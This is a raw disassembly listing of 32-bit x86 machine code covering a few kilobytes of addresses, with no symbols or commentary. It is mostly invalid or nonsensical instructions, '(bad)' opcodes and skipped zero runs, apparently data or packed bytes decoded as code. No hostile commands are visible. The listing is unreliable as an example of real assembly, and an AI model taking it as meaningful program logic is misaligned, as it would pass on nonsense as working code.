  4278bc:	dec    eax
  4278bd:	mov    ds:0xe3ff918f,al
  4278c2:	in     al,0x64
  4278c4:	jmp    DWORD PTR [ebx+0xf50001]
  4278ca:	add    BYTE PTR [eax],al
  4278cc:	cmp    bl,cl
  4278ce:	and    eax,0x4850200f
  4278d3:	jmp    0x4278d3
  4278d5:	test   eax,0x5018f6e0
  4278da:	xor    eax,edi
  4278dc:	mov    al,ds:0x3767b171
  4278e1:	xchg   ebx,eax
  4278e2:	lods   eax,DWORD PTR ds:[esi]
  4278e3:	add    eax,0xd9783a10
  4278e8:	stos   BYTE PTR es:[edi],al
  4278e9:	mov    dl,0x3f
  4278eb:	sub    eax,0x57af3bd8
  4278f0:	clc    
  4278f1:	js     0x42794f
  4278f3:	cld    
  4278f4:	ds ss and al,0x1d
  4278f8:	fwait
  4278f9:	mov    al,0x87
  4278fb:	mov    edi,0xf195613d
  427900:	test   eax,0xbf25bad3
  427905:	push   edi
  427906:	cmp    esp,DWORD PTR [ebp+edx*1+0xc06941b]
  42790d:	(bad)  
  42790e:	sub    edi,DWORD PTR [edx+edx*1+0x6fce7037]
  427915:	and    al,0x67
  427917:	inc    ebp
  427918:	mov    bl,0xf6
  42791a:	xchg   esp,eax
  42791b:	leave  
  42791c:	dec    edi
  42791d:	mov    eax,ds:0xe280c41a
  427922:	xchg   esp,eax
  427923:	sbb    ebx,DWORD PTR [ebx]
  427925:	jbe    0x427953
  427927:	sub    al,0x67
  427929:	pop    DWORD PTR [edi+0x68c45806]
  42792f:	ins    DWORD PTR es:[edi],dx
  427930:	mov    eax,ds:0x3aeb1da9
  427935:	cli    
  427936:	jne    0x427955
  427938:	dec    ecx
  427939:	mov    ebx,cs
  42793b:	pop    edx
  42793c:	xor    al,ah
  42793e:	mov    esi,0x2aea6f6c
  427943:	and    esi,DWORD PTR [eax]
  427945:	jmp    0x427987
  427947:	push   edx
  427948:	sub    al,0x4e
  42794a:	sub    BYTE PTR [esi],ah
  42794c:	mov    dl,0xf4
  42794e:	jle    0x42793c
  427950:	addr16 push esp
  427952:	and    DWORD PTR [edi],eax
  427954:	xchg   ebx,eax
  427955:	std    
  427956:	add    DWORD PTR [edx],esi
  427958:	shl    BYTE PTR [esi],cl
  42795a:	push   ecx
  42795b:	out    dx,al
  42795c:	cmp    BYTE PTR [esi+0x57],cl
  42795f:	xor    al,0xd4
  427961:	retf   0xdffc
  427964:	jo     0x4278f7
  427966:	mov    al,ds:0xdf83d539
  42796b:	paddd  mm5,QWORD PTR [ecx-0xd]
  42796f:	aam    0xee
  427971:	out    dx,al
  427972:	push   edx
  427973:	mov    BYTE PTR [ecx],al
  427975:	enter  0x26f,0x51
  427979:	xchg   esp,eax
  42797a:	aas    
  42797b:	pop    es
  42797c:	(bad)  
  42797d:	jmp    0x93504756
  427982:	jne    0x427a02
  427984:	jle    0x42799d
  427986:	loope  0x427989
  427988:	into   
  427989:	fsub   DWORD PTR [edx+0x46]
  42798c:	inc    ebp
  42798d:	dec    ebx
  42798e:	test   eax,0xca5d923d
  427993:	mov    ecx,DWORD PTR [ebp+0x30]
  427996:	cmp    DWORD PTR [ecx],edi
  427998:	hlt    
  427999:	jo     0x427a0b
  42799b:	(bad)  
  42799c:	aad    0x41
  42799e:	adc    DWORD PTR ds:0x15062638,edi
  4279a4:	sub    BYTE PTR [ecx+0x21fd1283],bl
  4279aa:	xchg   ebp,eax
  4279ab:	xchg   esp,ebp
  4279ad:	push   ecx
  4279ae:	dec    edi
  4279b0:	cmp    dh,0xf9
  4279b3:	xor    edx,DWORD PTR [edi-0x3f]
  4279b6:	imul   edx,DWORD PTR [ecx+edx*2+0x5],0xd21ee0d1
  4279be:	mov    edx,0x18b3
	...
  427a33:	add    BYTE PTR [ecx-0x42a9f2d8],bl
  427a39:	ja     0x427a16
  427a3b:	out    dx,eax
  427a3c:	das    
  427a3d:	mov    ch,0xeb
  427a3f:	aam    0x15
  427a41:	cmp    al,0x18
  427a43:	mov    ds:0x1a4f4,al
  427a48:	cmc    
  427a49:	add    BYTE PTR [eax],al
  427a4b:	add    BYTE PTR [ecx+0x708c62ac],dh
  427a51:	sbb    eax,0x9e0970ff
  427a56:	mov    esp,0x337339b6
  427a5b:	shld   DWORD PTR [edi],ebp,0xc5
  427a5f:	sbb    bh,BYTE PTR [eax]
  427a61:	pop    ds
  427a62:	fdivr  QWORD PTR [eax-0x52]
  427a65:	dec    edx
  427a66:	fcmovb st,st(4)
  427a68:	cmc    
  427a69:	jb     0x427a65
  427a6b:	mov    BYTE PTR [ebx-0x4a],ch
  427a6e:	add    BYTE PTR [esi-0x13b414a9],bh
  427a74:	sahf   
  427a75:	repnz pop ecx
  427a77:	jp     0x427a91
  427a79:	in     eax,0x8
  427a7b:	mov    edx,0x98e1077e
  427a80:	push   0xd7f905ea
  427a85:	pushf  
  427a86:	mov    ss,WORD PTR [eax]
  427a88:	leave  
  427a89:	dec    esi
  427a8a:	inc    esi
  427a8b:	sbb    esi,DWORD PTR [esi-0x37170844]
  427a91:	fdivrp st(0),st
  427a93:	stos   BYTE PTR es:[edi],al
  427a94:	or     DWORD PTR [edx-0x2497858],0x332195d2
  427a9e:	loop   0x427b12
  427aa0:	mov    edx,0xc5cd92db
  427aa5:	cdq    
  427aa6:	push   ecx
  427aa7:	and    eax,0xb4a6e754
  427aac:	in     al,dx
  427aad:	jae    0x427acd
  427aaf:	clc    
  427ab0:	dec    ebx
  427ab1:	add    DWORD PTR [ebx+edx*4],esp
  427ab4:	xchg   ebp,eax
  427ab5:	test   BYTE PTR [edi+0x69ab5ce5],bh
  427abb:	inc    ebx
  427abc:	sar    DWORD PTR [eax-0x61],0x5a
  427ac0:	hlt    
  427ac1:	jne    0x427a75
  427ac3:	(bad)  
  427ac4:	adc    BYTE PTR [ecx-0x1e197dc8],ch
  427aca:	lds    edi,FWORD PTR [esi+edx*1-0xa6c9652]
  427ad1:	retf   
  427ad2:	dec    ebx
  427ad3:	stos   DWORD PTR es:[edi],eax
  427ad4:	fcom   QWORD PTR [ebx-0xb9036f2]
  427ada:	or     eax,0x8f113842
  427adf:	or     bl,ah
  427ae1:	xchg   ecx,eax
  427ae2:	jno    0x427af1
  427ae4:	dec    ebp
  427ae5:	ins    DWORD PTR es:[edi],dx
  427ae6:	xchg   ecx,eax
  427ae7:	adc    esi,eax
  427ae9:	sub    al,0x7a
  427aeb:	jne    0x427b42
  427aed:	js     0x427add
  427aef:	adc    BYTE PTR [esi-0x77ebeb65],ch
  427af5:	popf   
  427af6:	or     DWORD PTR [edx-0x6d],ecx
  427af9:	push   edi
  427afa:	add    edi,esp
  427afc:	cmp    eax,0x53c0f7f
  427b01:	or     al,dl
  427b03:	sub    edx,DWORD PTR [ebx]
  427b05:	ins    DWORD PTR es:[edi],dx
  427b06:	push   0xffffffa8
  427b08:	jae    0x427b66
  427b0a:	lea    ebp,[ebx-0x43]
  427b0d:	sbb    edx,DWORD PTR [edx+0x16]
  427b10:	dec    esp
  427b11:	fbld   TBYTE PTR [eax]
  427b13:	jne    0x427b16
  427b15:	xor    BYTE PTR [ebx-0x61268dc2],ah
  427b1b:	add    al,0x7
  427b1d:	mov    ds:0x7500c259,al
  427b22:	mov    BYTE PTR [edi-0x72fe2a1b],cl
  427b28:	es loope 0x427b67
  427b2b:	jnp    0x427afe
  427b2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427b2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427b2f:	cwde   
  427b30:	bound  esi,QWORD PTR [eax+0x5e]
  427b33:	dec    ebp
  427b34:	sahf   
  427b35:	mov    esi,0x1b8e3aa3
  427b3a:	mov    ds:0x671c1681,al
  427b3f:	arpl   WORD PTR [ebx],ax
	...
  427bb1:	add    BYTE PTR [eax],al
  427bb3:	add    dl,ah
  427bb5:	pusha  
  427bb6:	test   DWORD PTR [esi+0x74f3f787],esi
  427bbc:	mov    eax,0x7e14fe65
  427bc1:	push   ebx
  427bc2:	bound  esi,QWORD PTR [edx+0x1a5e9]
  427bc8:	cmc    
  427bc9:	add    BYTE PTR [eax],al
  427bcb:	add    BYTE PTR [ecx-0x16],cl
  427bce:	dec    ebx
  427bcf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427bd0:	mov    ecx,0xaf0018df
  427bd5:	pop    ecx
  427bd6:	rol    DWORD PTR [ebx-0x67],1
  427bd9:	imul   edi,DWORD PTR [ebx],0x296c70ce
  427bdf:	stos   DWORD PTR es:[edi],eax
  427be0:	ins    BYTE PTR es:[edi],dx
  427be1:	mov    ebx,0xbbb9f042
  427be6:	(bad)  
  427be7:	jl     0x427c21
  427be9:	cld    
  427bea:	xchg   edx,eax
  427beb:	cmp    eax,0x790dac01
  427bf0:	add    ch,0xe6
  427bf3:	push   eax
  427bf4:	xchg   ebx,eax
  427bf5:	jae    0x427c32
  427bf7:	jae    0x427b82
  427bf9:	lods   eax,DWORD PTR ds:[esi]
  427bfa:	stc    
  427bfb:	adc    DWORD PTR [edi],0xe
  427bfe:	data16 cmp dl,dl
  427c01:	ror    edi,1
  427c03:	cmp    DWORD PTR [ebx+0x75ec7141],esi
  427c09:	sahf   
  427c0a:	in     al,dx
  427c0b:	in     eax,0x6b
  427c0d:	mov    edi,0xa4f323da
  427c12:	xor    edx,edx
  427c14:	addr16 leave 
  427c16:	xor    ah,bl
  427c18:	(bad)  
  427c19:	test   DWORD PTR [esi+0x7d],esp
  427c1c:	int3   
  427c1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427c1e:	jno    0x427c68
  427c20:	leave  
  427c21:	adc    al,0xca
  427c23:	sub    eax,DWORD PTR [esi+0x44fb186]
  427c29:	test   ecx,eax
  427c2b:	and    al,0xab
  427c2d:	out    dx,al
  427c2e:	and    al,0xd7
  427c30:	cmp    eax,0x8a3c7f98
  427c35:	jns    0x427ca8
  427c37:	mov    cl,0x59
  427c39:	sbb    BYTE PTR [ebx+ebx*2],ch
  427c3c:	lea    ebp,[edi-0x2d0f731b]
  427c42:	(bad)  
  427c43:	in     eax,0x5e
  427c45:	mov    dh,0xcc
  427c47:	cmc    
  427c48:	pusha  
  427c49:	mov    ebx,0xb9ca0268
  427c4e:	inc    eax
  427c4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427c50:	dec    esi
  427c51:	mov    esi,DWORD PTR [edx+ebx*1+0x6a]
  427c55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427c56:	mov    edi,0xbcd2db27
  427c5b:	xor    al,0x71
  427c5d:	repnz or sp,WORD PTR [esi+0x2e]
  427c62:	and    DWORD PTR [ebx+0xf],ebp
  427c65:	(bad)  
  427c66:	call   0x62e99c96
  427c6b:	ss pop edi
  427c6d:	sub    dl,bh
  427c6f:	gs inc ecx
  427c71:	retf   
  427c72:	lds    edx,FWORD PTR [esi-0x54a9bad1]
  427c78:	int    0x9e
  427c7a:	xor    al,0x4a
  427c7c:	xor    DWORD PTR [ebx+ecx*1+0x23],edx
  427c80:	mov    WORD PTR [ecx-0x70],es
  427c83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427c84:	mov    ecx,?
  427c86:	jge    0x427cf5
  427c88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427c89:	push   ecx
  427c8a:	not    BYTE PTR [esi+0x4e5b70ce]
  427c90:	add    DWORD PTR [esi-0x5e0adca7],esp
  427c96:	addr16 xor eax,0x2ce0fb16
  427c9c:	loop   0x427c4c
  427c9e:	mov    bl,0x6a
  427ca0:	xchg   BYTE PTR [eax],cl
  427ca2:	and    DWORD PTR [edx],eax
  427ca4:	mov    ebp,0x22e39fb2
  427ca9:	add    al,0x80
  427cab:	lods   al,BYTE PTR ds:[esi]
  427cac:	ret    0x792c
  427caf:	mov    al,ds:0xe5ce262d
  427cb4:	jns    0x427c85
  427cb6:	aas    
  427cb7:	xchg   edi,eax
  427cb8:	retf   
  427cb9:	shr    BYTE PTR [eax-0x56],0x58
  427cbd:	fstp   QWORD PTR [edx-0x54]
  427cc0:	loopne 0x427cc2
	...
  427d32:	add    BYTE PTR [eax],al
  427d34:	or     dh,BYTE PTR [ecx-0xc040c9f]
  427d3a:	call   0xe9a1:0xdc63ecf9
  427d41:	add    ah,bl
  427d43:	cmp    ebx,esi
  427d45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427d46:	add    DWORD PTR [eax],eax
  427d48:	cmc    
  427d49:	add    BYTE PTR [eax],al
  427d4b:	add    BYTE PTR [ebp+0x402053e0],ah
  427d51:	aam    0x5c
  427d53:	fwait
  427d54:	rcl    BYTE PTR [edi],0x1e
  427d57:	adc    bh,bl
  427d59:	les    eax,FWORD PTR [ebx]
  427d5b:	push   ss
  427d5c:	add    DWORD PTR cs:[ecx-0x1777ed26],ecx
  427d63:	aam    0xee
  427d65:	dec    esp
  427d66:	inc    esi
  427d67:	push   esp
  427d68:	ficomp WORD PTR ds:0x9aa7452a
  427d6e:	push   cs
  427d6f:	jns    0x427db7
  427d71:	(bad)  
  427d72:	add    bh,BYTE PTR fs:[edi+ecx*4+0x53]
  427d77:	pop    esi
  427d78:	add    bh,BYTE PTR ds:0xb3778dcd
  427d7e:	dec    esi
  427d7f:	repz jg 0x427dab
  427d82:	pop    esp
  427d83:	lods   eax,DWORD PTR ds:[esi]
  427d84:	(bad)  
  427d86:	ret    
  427d87:	aam    0x2
  427d89:	aas    
  427d8a:	inc    esp
  427d8b:	sbb    eax,0xf976aa7c
  427d90:	mov    dl,0xba
  427d92:	push   es
  427d93:	mov    eax,ds:0xfc8635e8
  427d98:	add    BYTE PTR [ebx+0x43e6622b],bh
  427d9e:	push   cs
  427d9f:	stc    
  427da0:	dec    BYTE PTR [eax+0x4afcc5b4]
  427da6:	rcr    BYTE PTR [edi+ebp*8-0x7a3167c7],cl
  427dad:	jmp    0xbecc9109
  427db2:	mov    esi,0x16a2ecd2
  427db7:	jae    0x427d4c
  427db9:	test   eax,0xd309280a
  427dbe:	ftst   
  427dc0:	mov    DWORD PTR [ecx+eiz*8-0x65],ebp
  427dc4:	loop   0x427e37
  427dc6:	ret    0xf4d8
  427dc9:	push   0xa68e5de
  427dce:	imul   edx,DWORD PTR [esi-0x54],0x46
  427dd2:	(bad)  
  427dd4:	and    cl,BYTE PTR [eax+0x2d347e4c]
  427dda:	add    esi,DWORD PTR [ecx-0x215713f4]
  427de0:	aad    0xd3
  427de2:	retf   
  427de3:	xlat   BYTE PTR ds:[ebx]
  427de4:	sbb    al,0x9
  427de6:	repnz jmp 0xd560:0xff956e8f
  427dee:	xlat   BYTE PTR ds:[ebx]
  427def:	stos   BYTE PTR es:[edi],al
  427df0:	aaa    
  427df1:	inc    esp
  427df2:	out    dx,eax
  427df3:	cmc    
  427df4:	imul   edx,esi,0xffffffd1
  427df7:	pop    ebx
  427df8:	ins    BYTE PTR es:[edi],dx
  427df9:	xchg   ebp,eax
  427dfa:	outs   dx,DWORD PTR ds:[esi]
  427dfb:	dec    edx
  427dfc:	or     BYTE PTR [ebp+0x11],ah
  427dff:	arpl   WORD PTR [eax],bp
  427e01:	or     ch,BYTE PTR [esi]
  427e03:	popf   
  427e04:	(bad)  [edx-0x319c40b0]
  427e0a:	or     dh,BYTE PTR [edi+ecx*8]
  427e0d:	jecxz  0x427de2
  427e0f:	adc    ch,ah
  427e11:	fldenv [ebx-0x11]
  427e14:	call   FWORD PTR [edi]
  427e16:	jo     0x427dda
  427e18:	ins    BYTE PTR es:[edi],dx
  427e19:	std    
  427e1a:	imul   ebp,DWORD PTR [esi-0x7f7ec82d],0x7f
  427e21:	imul   esi,esp,0x461ed1a7
  427e27:	fiadd  WORD PTR [ebp+0x3d42568]
  427e2d:	xor    DWORD PTR [eax+ecx*1+0x490afa05],edx
  427e34:	sbb    BYTE PTR [esi-0x284c47f3],dl
  427e3a:	jecxz  0x427e37
  427e3c:	fiadd  DWORD PTR ds:0x5219df
	...
  427eb2:	add    BYTE PTR [eax],al
  427eb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427eb5:	mov    ds:0xf5c7f1c7,al
  427eba:	mov    dh,0xf7
  427ebc:	mov    ebx,esi
  427ebe:	cmp    ebx,edx
  427ec0:	jae    0x427e54
  427ec2:	pushf  
  427ec3:	outs   dx,DWORD PTR ds:[esi]
  427ec4:	shl    DWORD PTR [edi+0xf50001],cl
  427eca:	add    BYTE PTR [eax],al
  427ecc:	mov    ds:0xf7703448,eax
  427ed1:	loope  0x427ec0
  427ed3:	and    BYTE PTR [ebp-0x13bddafc],ch
  427ed9:	and    BYTE PTR [edx],0x24
  427edc:	mov    ds:0xe9b6941d,eax
  427ee1:	xchg   edi,eax
  427ee2:	std    
  427ee3:	mov    ?,esi
  427ee5:	push   ss
  427ee6:	sub    DWORD PTR [esi+ebx*1],ebp
  427ee9:	push   edi
  427eea:	sbb    dl,BYTE PTR [ecx]
  427eec:	mov    esi,0xf3e028f3
  427ef1:	or     DWORD PTR [edi],ecx
  427ef3:	outs   dx,DWORD PTR ds:[esi]
  427ef4:	pop    es
  427ef5:	jle    0x427f6c
  427ef7:	adc    al,0xfa
  427ef9:	bound  esp,QWORD PTR [eax]
  427efb:	mov    bl,0x10
  427efd:	mov    ah,0xe6
  427eff:	je     0x427edd
  427f01:	mov    ch,0x81
  427f03:	loop   0x427eb3
  427f05:	jecxz  0x427f44
  427f07:	sti    
  427f08:	push   edx
  427f09:	sub    bh,0xe7
  427f0c:	je     0x427f6a
  427f0e:	and    edi,DWORD PTR [edi*4-0xcb2aeb5]
  427f15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427f16:	inc    esp
  427f17:	push   ecx
  427f18:	aad    0x32
  427f1a:	ins    BYTE PTR es:[edi],dx
  427f1b:	sub    edi,DWORD PTR [edx+eiz*1-0x7c]
  427f1f:	jo     0x427f17
  427f21:	inc    esi
  427f22:	sti    
  427f23:	jmp    0x59af0ddc
  427f28:	out    dx,al
  427f29:	sub    BYTE PTR [ebp+0x3dd5fd62],dl
  427f2f:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  427f31:	add    BYTE PTR [edi-0x33],bl
  427f34:	icebp  
  427f35:	push   ss
  427f36:	mov    edx,0x50ec78bf
  427f3b:	adc    ah,BYTE PTR ds:0x5a2c6982
  427f41:	dec    esp
  427f42:	stos   BYTE PTR es:[edi],al
  427f43:	in     eax,0x7
  427f45:	out    0x5d,al
  427f47:	call   0x9fec:0x20403d3f
  427f4e:	dec    edx
  427f4f:	sahf   
  427f50:	out    0xa2,al
  427f52:	and    al,0x2c
  427f54:	push   0xe2497c6b
  427f59:	jg     0x427f0e
  427f5b:	mov    al,ds:0xd20360b6
  427f60:	call   0x2512e3ee
  427f65:	jne    0x427f87
  427f67:	inc    ecx
  427f68:	cmpxchg BYTE PTR [esi-0x2],bl
  427f6c:	cmc    
  427f6d:	pop    edi
  427f6e:	mov    esp,0xdcfe4761
  427f73:	repz mov gs,esp
  427f76:	or     eax,0x9174fee3
  427f7b:	rol    BYTE PTR [esi],1
  427f7d:	or     eax,DWORD PTR [ebp-0x19]
  427f80:	sub    BYTE PTR [edi],dh
  427f82:	push   ss
  427f83:	mov    ds:0x19a9aa17,eax
  427f88:	sub    bh,BYTE PTR [ebx-0x41]
  427f8b:	mov    edx,0xd676e352
  427f90:	pop    esp
  427f91:	pop    ecx
  427f92:	retf   0x5c44
  427f95:	or     al,0x59
  427f97:	inc    eax
  427f98:	imul   esi,edi,0xee9d0569
  427f9e:	fild   DWORD PTR [ebp-0x16]
  427fa1:	retf   
  427fa2:	inc    ebx
  427fa3:	cmp    bh,dh
  427fa5:	xchg   BYTE PTR [eax-0x3f],ch
  427fa8:	adc    BYTE PTR [ebp-0x618720f5],dh
  427fae:	push   ebp
  427faf:	fldenv [edi]
  427fb1:	xor    dh,0x74
  427fb4:	popf   
  427fb5:	stos   BYTE PTR es:[edi],al
  427fb6:	les    edx,FWORD PTR [ecx]
  427fb8:	out    0x61,eax
  427fba:	xlat   BYTE PTR ds:[ebx]
  427fbb:	xor    al,0x6f
  427fbd:	xchg   edi,eax
  427fbe:	add    edi,0xffffffd2
	...
  428031:	add    BYTE PTR [eax],al
  428033:	add    BYTE PTR [ebp*2-0x8846ae6],cl
  42803a:	(bad)  
  42803b:	std    
  42803c:	mov    DWORD PTR [ebx+0x5a],edx
  42803f:	xchg   DWORD PTR [ebx],edx
  428041:	mov    ah,BYTE PTR [eax]
  428043:	pop    ebp
  428044:	enter  0x1a8,0x0
  428048:	cmc    
  428049:	add    BYTE PTR [eax],al
  42804b:	add    BYTE PTR [edx+0x1005efdc],al
  428051:	lock mov esp,?
  428054:	stos   BYTE PTR es:[edi],al
  428055:	test   ah,dl
  428057:	(bad)  
  428058:	push   edi
  428059:	inc    ebp
  42805a:	daa    
  42805b:	push   ds
  42805c:	push   ds
  42805d:	or     BYTE PTR [eax-0x422b527a],ah
  428063:	push   ecx
  428064:	ret    0x859e
  428067:	jmp    0x4280df
  428069:	gs jb  0x42809f
  42806c:	std    
  42806d:	ja     0x42808b
  42806f:	arpl   WORD PTR [ebp+eax*2+0x455705fc],sp
  428076:	xchg   ebx,eax
  428077:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428078:	jge    0x42802f
  42807a:	fs pop edx
  42807c:	push   ebp
  42807d:	sbb    dl,BYTE PTR [ebx+edx*8-0x55b06c26]
  428084:	cmp    BYTE PTR [ebp+0xe3827f1],0xf2
  42808b:	jmp    0x42806a
  42808d:	ja     0x42808b
  42808f:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428091:	daa    
  428092:	jl     0x428042
  428094:	xor    BYTE PTR [ebx],bl
  428096:	xchg   ebx,eax
  428097:	pop    ebx
  428098:	popf   
  428099:	aaa    
  42809a:	dec    ebx
  42809b:	push   0xfffffff1
  42809d:	clc    
  42809e:	lea    edi,[ebx]
  4280a0:	sbb    eax,0x420838c7
  4280a5:	dec    edi
  4280a6:	push   ebp
  4280a7:	and    al,0x27
  4280a9:	lahf   
  4280aa:	nop
  4280ab:	mov    esi,0xe3ade6d6
  4280b0:	add    al,0x84
  4280b2:	data16 xchg BYTE PTR [ebx+0x76],dl
  4280b6:	(bad)  [eax]
  4280b8:	fiadd  WORD PTR [esi+0x40]
  4280bb:	xchg   ecx,esp
  4280bd:	lea    esp,[eax+ebp*2+0x36]
  4280c1:	fisub  DWORD PTR [eax-0x4f]
  4280c4:	cli    
  4280c5:	sar    DWORD PTR [eax+0x5046353f],cl
  4280cb:	in     al,0x12
  4280cd:	inc    esi
  4280ce:	into   
  4280cf:	xor    ah,BYTE PTR [ebx]
  4280d1:	push   ebp
  4280d2:	push   eax
  4280d3:	mov    ah,dl
  4280d5:	(bad)  
  4280d6:	je     0x4280d8
  4280d8:	ss pop ebx
  4280da:	xchg   ebx,eax
  4280db:	cdq    
  4280dc:	leave  
  4280dd:	jp     0x42811c
  4280df:	inc    ebp
  4280e0:	ss out 0x62,eax
  4280e3:	dec    eax
  4280e4:	(bad)  
  4280e5:	enter  0x308a,0x8a
  4280e9:	imul   edi,DWORD PTR [eax+esi*4-0x50d3ee0e],0x2beb1535
  4280f4:	adc    eax,0xe5f38fae
  4280f9:	aam    0x9a
  4280fb:	out    dx,eax
  4280fc:	loope  0x428131
  4280fe:	xchg   ebx,eax
  4280ff:	cwde   
  428100:	cmp    DWORD PTR [eax+0x73],edi
  428103:	push   0x3d
  428105:	add    eax,eax
  428107:	iret   
  428108:	bound  ebp,QWORD PTR [ebx-0x67]
  42810b:	scas   al,BYTE PTR es:[edi]
  42810c:	cdq    
  42810d:	test   eax,0xc3fae6
  428112:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  428114:	jmp    0x5ea176e5
  428119:	sbb    bh,BYTE PTR [edx]
  42811b:	mov    al,0x1f
  42811d:	or     DWORD PTR [eax+0x32c96b51],esp
  428123:	das    
  428124:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428125:	mov    cl,0x10
  428127:	mov    ebp,0xd23a919e
  42812c:	not    DWORD PTR [ebx+0x9c4ca16]
  428132:	add    BYTE PTR [ecx+0x14],0xc2
  428136:	ins    DWORD PTR es:[edi],dx
  428137:	lea    ecx,[eax]
  428139:	cs mov cl,0xeb
  42813c:	pushf  
  42813d:	fsincos 
  42813f:	(bad)  
  428140:	and    BYTE PTR [eax],al
	...
  4281b2:	add    BYTE PTR [eax],al
  4281b4:	push   ds
  4281b5:	inc    ecx
  4281b6:	fdiv   QWORD PTR [edi+ebx*8+0x79eb7ebd]
  4281bd:	stos   BYTE PTR es:[edi],al
  4281be:	push   0x955e34f
  4281c3:	sbb    edi,DWORD PTR [ebp-0xafffe57]
  4281c9:	add    BYTE PTR [eax],al
  4281cb:	add    BYTE PTR [eax+0x1046d65b],al
  4281d1:	inc    ecx
  4281d2:	add    al,0xec
  4281d4:	idiv   ah
  4281d6:	test   eax,0x4327f2d7
  4281db:	shr    esp,1
  4281dd:	jle    0x4281ef
  4281df:	rcl    bh,cl
  4281e1:	sub    al,0x15
  4281e3:	pop    edx
  4281e4:	ret    
  4281e5:	inc    ebp
  4281e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4281e7:	dec    ebp
  4281e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4281e9:	mov    ds:0x8292a475,al
  4281ee:	call   0x29c7:0x4d5bcf77
  4281f5:	xchg   ebx,eax
  4281f6:	jbe    0x4281cf
  4281f8:	add    BYTE PTR [edi+0x2a],cl
  4281fb:	mov    edi,0xa65bb6c8
  428200:	xchg   ecx,eax
  428201:	add    ch,bl
  428203:	xor    DWORD PTR [ebx+0x383b3523],edi
  428209:	xchg   DWORD PTR [edx+0x12],edi
  42820c:	mov    al,0x48
  42820e:	outs   dx,BYTE PTR ds:[esi]
  42820f:	(bad)  
  428210:	outs   dx,DWORD PTR ds:[esi]
  428211:	loopne 0x4281cb
  428213:	lea    esp,[ebx+ebp*8]
  428216:	fist   WORD PTR [esi]
  428218:	call   0xd293:0xdbeb931
  42821f:	xor    al,0xf6
  428221:	xchg   DWORD PTR [edi+edx*1+0x36d2cf88],esi
  428228:	in     al,0xd7
  42822a:	neg    esi
  42822c:	mov    al,ds:0x32b1793b
  428231:	sbb    edx,DWORD PTR [eax+edx*2]
  428234:	cld    
  428235:	test   DWORD PTR [esi-0x63],esp
  428238:	pop    esi
  428239:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42823a:	mov    eax,ds:0x44d5b681
  42823f:	gs push edi
  428241:	stos   DWORD PTR es:[edi],eax
  428242:	or     ecx,DWORD PTR [esi+0x38b88fe7]
  428248:	xchg   ecx,eax
  428249:	mov    bh,0x79
  42824b:	jmp    0xccde585a
  428250:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428251:	ins    DWORD PTR es:[edi],dx
  428252:	push   edi
  428253:	(bad)  [edi-0x2d]
  428256:	ror    DWORD PTR [ecx+edx*2-0x5a3db972],cl
  42825d:	add    eax,DWORD PTR [edx-0x1]
  428260:	popf   
  428261:	out    dx,al
  428262:	mov    ecx,0x136085e9
  428267:	(bad)  
  428268:	in     al,dx
  428269:	xor    BYTE PTR [ecx],dh
  42826b:	out    0x16,al
  42826d:	mov    BYTE PTR [ebx-0x6b],dh
  428270:	and    eax,0x389ce613
  428275:	and    eax,0xb903caf7
  42827a:	sbb    esp,edi
  42827c:	sub    eax,DWORD PTR ds:0xa6f44f2
  428282:	jle    0x42822a
  428284:	popf   
  428285:	xor    eax,0x424d5285
  42828b:	(bad)  
  42828d:	xor    BYTE PTR [eax-0x735516a7],dl
  428293:	inc    eax
  428294:	scas   al,BYTE PTR es:[edi]
  428295:	jecxz  0x42824e
  428297:	test   DWORD PTR [esi],edi
  428299:	mov    DWORD PTR ss:[eax-0x3a6ee6f0],ebx
  4282a0:	and    al,0x2d
  4282a2:	out    dx,eax
  4282a3:	inc    ebp
  4282a4:	fstp   QWORD PTR [esi]
  4282a6:	sub    al,0x71
  4282a8:	imul   ecx,DWORD PTR [edi*8+0x688c8fe9],0x15
  4282b0:	inc    esi
  4282b1:	(bad)  
  4282b2:	sbb    BYTE PTR [esi+0xb0e95a3],bl
  4282b8:	dec    edx
  4282b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4282ba:	dec    ecx
  4282bb:	lods   eax,DWORD PTR ds:[esi]
  4282bc:	dec    DWORD PTR [ebx]
  4282be:	mov    dl,0xe2
  4282c0:	pop    esp
	...
  428331:	add    BYTE PTR [eax],al
  428333:	add    BYTE PTR [edx],dl
  428335:	sbb    eax,0xaf3f8832
  42833a:	mov    edx,0x671fe09f
  42833f:	pusha  
  428340:	jecxz  0x4283bb
  428342:	and    al,0xce
  428344:	mov    dl,0xaa
  428346:	add    DWORD PTR [eax],eax
  428348:	cmc    
  428349:	add    BYTE PTR [eax],al
  42834b:	add    BYTE PTR [ebx+0x8],al
  42834e:	sbb    DWORD PTR [eax],ebx
  428350:	pop    edi
  428351:	mov    ecx,DWORD PTR [edi+0x3b6bab9b]
  428357:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428358:	imul   edx,DWORD PTR [edx+0x9e74676],0x31
  42835f:	cmp    cl,bh
  428361:	add    ah,BYTE PTR [ebp+edx*2+0x7c]
  428365:	mov    dl,0x2f
  428367:	push   ecx
  428368:	xlat   BYTE PTR ds:[ebx]
  428369:	or     al,0x16
  42836b:	sub    ecx,edi
  42836d:	mov    ebp,0x8109ea42
  428372:	mov    eax,0x7d37d3a6
  428377:	adc    al,0xe
  428379:	ja     0x4283af
  42837b:	(bad)  
